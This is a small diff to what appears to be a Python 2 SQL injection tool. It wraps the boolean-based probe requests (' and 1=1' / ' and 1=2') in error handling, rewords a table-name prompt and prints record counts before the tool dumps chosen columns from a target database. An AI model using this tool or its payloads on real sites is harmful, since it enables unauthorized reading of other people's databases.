@@ -22,9 +22,15 @@ messages if the url is vulnerable.
 def validate_vulnerable(url):
 	success_url = url + " and 1=1"
 	failure_url = url + " and 1=2"
-	page_content = requests.get(url)
-	page_content_success = requests.get(success_url)
-	page_content_failure = requests.get(failure_url)
+	try:
+		page_content = requests.get(url)
+		page_content_success = requests.get(success_url)
+		page_content_failure = requests.get(failure_url)
+
+	except requests.exceptions.RequestException as e:
+		print "Invalid URL!!!"
+		print e
+		sys.exit(1)
 
 	page_success = page_content_success.text
 	page_failure = page_content_failure.text
@@ -183,7 +189,7 @@ if __name__ == "__main__":
 
 		print table_s
 
-		t_name = raw_input("Enter table name to read data from: ").lower()
+		t_name = raw_input("Enter one table name to read data from: ").lower()
 		if t_name not in exploit_dict['tableNames']:
 			print "Not a valid table"
 			sys.exit(0)
@@ -200,12 +206,13 @@ if __name__ == "__main__":
 			cols_temp = columns_loaded[t_name]
 		
 		row_count = exploit_recordsCount[t_name].get('recCount')
-
+		
+		print t_name + " has " + row_count + " record(s)..."
 		print "Columns in table " + t_name			
 		column_s = PrettyTable()
 		column_s.add_column("Column(s)",exploit_columnNames[t_name])
 		print column_s
-
+		
 		cols = raw_input("Enter columns you want separated with ':' like 'col1:col2:col3' - ").lower()
 			
 
